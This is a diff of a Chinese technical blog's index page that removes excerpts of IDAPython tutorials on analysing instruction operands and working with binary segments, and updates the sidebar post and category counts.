-<p>同样，对一个<code>LDR</code>指令进行分析：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;ea = idc.here()</span><br><span class="line">Python&gt;idc.GetDisasm(ea)</span><br><span class="line"><span class="string">&#x27;LDR             R3, =aTagSIsEmpty; &quot;tag %s is empty\\n&quot;&#x27;</span></span><br><span class="line">Python&gt;idc.get_operand_type(ea, <span class="number">0</span>)  <span class="comment"># 第一个操作数类型：寄存器</span></span><br><span class="line"><span class="number">0x1</span></span><br><span class="line">Python&gt;idc.get_operand_value(ea, <span class="number">0</span>) <span class="comment"># 第一个操作数值：寄存器编号3-&gt;R3</span></span><br><span class="line"><span class="number">0x3</span></span><br><span class="line">Python&gt;idc.get_operand_type(ea, <span class="number">1</span>)  <span class="comment"># 第二个操作数类型：直接内存引用</span></span><br><span class="line"><span class="number">0x2</span></span><br><span class="line">Python&gt;idc.get_operand_value(ea, <span class="number">1</span>) <span class="comment"># 第二个操作数值：内存的地址0x12a8ac</span></span><br><span class="line"><span class="number">0x12a8ac</span></span><br></pre></td></tr></table></figure>
-<p>跳转到地址0x12a8ac，此处的确存储的是字符串的地址。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0012A8AC off_12A8AC      DCD aTagSIsEmpty        ; DATA XREF: sub_12A774+C8↑r</span><br><span class="line">.text:0012A8AC                                         ; &quot;tag %s is empty\n&quot;</span><br></pre></td></tr></table></figure>
-<p>对一个跳转指令<code>BL</code>进行分析：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;ea = idc.here()</span><br><span class="line">Python&gt;idc.GetDisasm(ea)</span><br><span class="line"><span class="string">&#x27;BL              ProcUserLog&#x27;</span></span><br><span class="line">Python&gt;idc.get_operand_type(ea, <span class="number">0</span>)</span><br><span class="line"><span class="number">0x7</span></span><br><span class="line">Python&gt;idc.get_operand_value(ea, <span class="number">0</span>)</span><br><span class="line"><span class="number">0x41e2c</span></span><br></pre></td></tr></table></figure>
-<p>其中，地址0x41e2位于plt中：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.plt:00041E2C</span><br><span class="line">.plt:00041E2C</span><br><span class="line">.plt:00041E2C ; Attributes: thunk</span><br><span class="line">.plt:00041E2C</span><br><span class="line">.plt:00041E2C ProcUserLog</span><br><span class="line">.plt:00041E2C ADR             R12, 0x141E34</span><br><span class="line">.plt:00041E30 ADD             R12, R12, #0x41000</span><br><span class="line">.plt:00041E34 LDR             PC, [R12,#(ProcUserLog_ptr - 0x182E34)]! ; __imp_ProcUserLog</span><br><span class="line">.plt:00041E34 ; End of function ProcUserLog</span><br><span class="line">.plt:00041E34</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/IDAPython-%E6%AE%B5%E7%B2%92%E5%BA%A6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="ToT">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/06/IDAPython-%E6%AE%B5%E7%B2%92%E5%BA%A6/" class="post-title-link" itemprop="url">IDAPython-段粒度</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-04-06 01:19:48" itemprop="dateCreated datePublished" datetime="2023-04-06T01:19:48+08:00">2023-04-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-11 13:48:03" itemprop="dateModified" datetime="2023-04-11T13:48:03+08:00">2023-04-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/IDAPython/" itemprop="url" rel="index"><span itemprop="name">IDAPython</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>简单说明了IDA的反汇编输出窗口内容、如何使用IDAPython对单条指令进行简单分析。后续的笔记将先分别从段（segment）、函数（function）、块（block）、指令（instruction）多个粒度，对IDAPython经常使用到的数据结构和函数API进行说明，然后再到分析必不可少的交叉引用（cross-references）和数据搜索（searching for code or data）。</p>
-<h2 id="segment的基本操作"><a href="#segment的基本操作" class="headerlink" title="segment的基本操作"></a>segment的基本操作</h2><p>如下是对段（segments）进行一些基本的操作。<code>idautils.Segments()</code>会返回一个迭代器，可以使用循环遍历当前文件的所有段对象。对于每一个段对象可以使用<code>idc.get_segm_name</code>获取段名、<code>idc.get_segm_start</code>获取段起始地址、<code>idc.get_segm_end</code>获取段的结束地址。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">for</span> seg <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">    <span class="built_in">print</span>(idc.get_segm_name(seg), idc.get_segm_start(seg), idc.get_segm_end(seg))</span><br><span class="line">    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">LOAD 4194304 4194568</span></span><br><span class="line"><span class="string">REGINFO 4194568 4194592</span></span><br><span class="line"><span class="string">LOAD 4194592 4216248</span></span><br><span class="line"><span class="string">.init 4216248 4216384</span></span><br><span class="line"><span class="string">.text 4216384 4649072</span></span><br><span class="line"><span class="string">.MIPS.stubs 4649072 4651008</span></span><br><span class="line"><span class="string">.fini 4651008 4651096</span></span><br><span class="line"><span class="string">LOAD 4651096 4651104</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>在实际的代码中，有时候需要对当前地址<code>ea</code>所在的段进行分析。<code>idc.get_segm_start(ea)</code>和<code>idc.get_segm_end(ea)</code>分别可以获取到地址<code>ea</code>所在的段的起始地址和结束地址；<code>idc.get_next_seg(ea)</code>可以获取到<code>ea</code>所在段的下一个段起始地址，然后没有找到对应的寻找上一个段起始地址的API。使用<code>idc.get_segm_name(ea)</code>则可以获取到当前地址<code>ea</code>所在段的段名。如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;ea = idc.here()</span><br><span class="line">Python&gt;idc.get_segm_start(ea)</span><br><span class="line"><span class="number">0x400120</span></span><br><span class="line">Python&gt;idc.get_segm_end(ea)</span><br><span class="line"><span class="number">0x46f8f8</span></span><br><span class="line">Python&gt;idc.get_next_seg(ea)</span><br><span class="line"><span class="number">0x46f8f8</span></span><br><span class="line">Python&gt;idc.get_segm_name(ea)</span><br><span class="line"><span class="string">&#x27;.text&#x27;</span></span><br><span class="line">Python&gt;idc.get_segm_name(<span class="number">0x46f8f8</span>)</span><br><span class="line"><span class="string">&#x27;.fini&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>同样的，也可以根据段名来获取到段相关属性：<code>idc.get_segm_by_sel(idc.selector_by_name(str_SectionName))</code>。需要首先使用<code>idc.selector_by_name(str_SectionName)</code>获取到段名为<code>str_SectionName</code>的段选择器（selector），然后使用<code>idc.get_segm_by_sel()</code>来获取到段的起始地址。如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;str_SectionName = <span class="string">&quot;.text&quot;</span></span><br><span class="line">Python&gt;idc.get_segm_by_sel(idc.selector_by_name(str_SectionName))</span><br><span class="line"><span class="number">0x400120</span></span><br></pre></td></tr></table></figure>
-<h2 id="idc模块中常用的段操作函数"><a href="#idc模块中常用的段操作函数" class="headerlink" title="idc模块中常用的段操作函数"></a>idc模块中常用的段操作函数</h2><table>
-<thead>
-<tr>
-<th>api</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>get_segm_attr(segea, attr)</td>
-<td>根据段中的地址segea获取段的attr属性</td>
-</tr>
-<tr>
-<td>get_segm_start(ea)</td>
-<td>获取段起始地址</td>
-</tr>
-<tr>
-<td>get_segm_end(ea)</td>
-<td>获取段结束地址</td>
-</tr>
-<tr>
-<td>get_segm_name(ea)</td>
-<td>获取段名</td>
-</tr>
-</tbody></table>
-<h2 id="包含更多段操作的模块：ida-segment"><a href="#包含更多段操作的模块：ida-segment" class="headerlink" title="包含更多段操作的模块：ida_segment"></a>包含更多段操作的模块：ida_segment</h2><p><code>idc</code>模块中对段的操作实际上是对<code>ida_segment</code>模块中函数的封装，在<code>ida_segment</code>模块中还有更多段的数据结构和方法，例如：</p>
-<ul>
-<li>新增段：<code>add_segm</code></li>
-<li>删除段：<code>del_segm</code></li>
-<li>根据段名获取段：<code>get_segm_by_name</code></li>
-<li>根据当前地址获取段名：<code>get_segm_name</code></li>
-<li>设置段名：<code>set_segm_name</code></li>
-<li>设置段的起始地址：<code>set_segm_start</code>、<code>set_segm_end</code></li>
-<li>……</li>
-</ul>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://www.hex-rays.com/products/ida/support/idapython_docs/idc.html">idc API documentation</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.hex-rays.com/products/ida/support/idapython_docs/ida_segment.html">ida_segment API documentation</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1403,14 +1336,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">64</span>
+          <span class="site-state-item-count">66</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">17</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
